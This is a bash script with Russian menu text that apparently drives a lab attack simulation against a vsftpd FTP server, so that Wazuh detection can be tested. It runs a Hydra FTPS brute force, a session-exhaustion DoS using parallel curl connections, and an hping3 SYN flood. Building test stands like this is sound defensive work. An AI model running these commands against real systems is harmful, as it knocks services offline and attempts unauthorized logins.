#!/bin/bash


VICTIM_IP="192.168.1.21"
TARGET_PORT="21"
LEgit_USER="vsftpd"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}===================================================================${NC}"
echo -e "${CYAN} ИНТЕРАКТИВНЫЙ МЕНЕДЖЕР СИМУЛЯЦИИ УГРОЗ ДЛЯ FTP (vsftpd) ${NC}"
echo -e "${CYAN}===================================================================${NC}"
echo -e "Адрес машины-жертвы: ${GREEN}${VICTIM_IP}${NC}"
echo ""
echo "Выберите тип угрозы для воспроизведения на стенде:"
echo "1) Интенсивный брутфорс легитимных учетных записей (FTPS/Hydra)"
echo "2) Прикладной DoS (Исчерпание лимита параллельных сессий max_per_ip)"
echo "3) Сетевой DoS (SYN-Flood флуд сетевого стека ядра Linux)"
echo "4) Выход из меню"
echo -e "${CYAN}------------------------------------------------------------------=${NC}"
read -p "Введите номер действия (1-4): " CHOICE

case $CHOICE in
    1)
        echo -e "\n${RED}[!] Запуск атаки Brute-Force через FTPS...${NC}"
        echo "Создание временного микро-словаря паролей..."
        echo -e "wrongpass1\nwrongpass2\nwrongpass3\nwrongpass4\nwrongpass5" > /tmp/fake_pass.txt

        echo "Запуск утилиты Hydra в режиме работы с SSL/TLS (-m S)..."
        "Authentication failure"
        hydra -l "$LEgit_USER" -P /tmp/fake_pass.txt ftp://"$VICTIM_IP" -m S -V -t 4

        rm -f /tmp/fake_pass.txt
        echo -e "\n${GREEN}[+] Симуляция брутфорса завершена. Проверьте события авторизации в Wazuh.${NC}"
        ;;

    2)
        echo -e "\n${RED}[!] Запуск прикладного DoS (Исчерпание лимитов подключений)...${NC}"
        echo "В конфигурации vsftpd.conf установлен лимит max_per_ip=5."
        echo "Открытие 7 параллельных фоновых сессий для вызова отказа в обслуживании..."

        for i in {1..7}; do
            curl --insecure --ftp-ssl ftp://"$VICTIM_IP" -u "$LEgit_USER":wrong_pass_limit --max-time 15 > /dev/null 2>&1 &
            echo "Открыто фоновое соединение #$i"
            sleep 0.5
        done

        echo -e "${CYAN}[*] Сессии запущены на 15 секунд. Попробуйте в этот момент подключиться легитимно.${NC}"
        sleep 15
        echo -e "\n${GREEN}[+] Время удержания сессий истекло. Ресурсы освобождены.${NC}"
        ;;

    3)
        echo -e "\n${RED}[!] Запуск сетевого DoS (SYN-Flood) на 21 порт...${NC}"
        echo "Внимание: Требуются права суперпользователя на атакующей машине."
        echo "Атака будет запущена на 10 секунд с помощью утилиты hping3."
        echo -e "${CYAN}[*] Логи vsftpd будут пусты. Отслеживайте сетевые аномалии в консоли Wazuh.${NC}"

        sudo timeout 10 hping3 -S -p "$TARGET_PORT" --flood "$VICTIM_IP"

        echo -e "\n${GREEN}[+] Сетевой флуд завершен.${NC}"
        ;;

    4)
        echo -e "\n${GREEN}Выход из менеджера симуляции.${NC}"
        exit 0
        ;;

    *)
        echo -e "\n${RED}[–] Неверный выбор. Пожалуйста, укажите число от 1 до 4.${NC}"
        ;;
esac
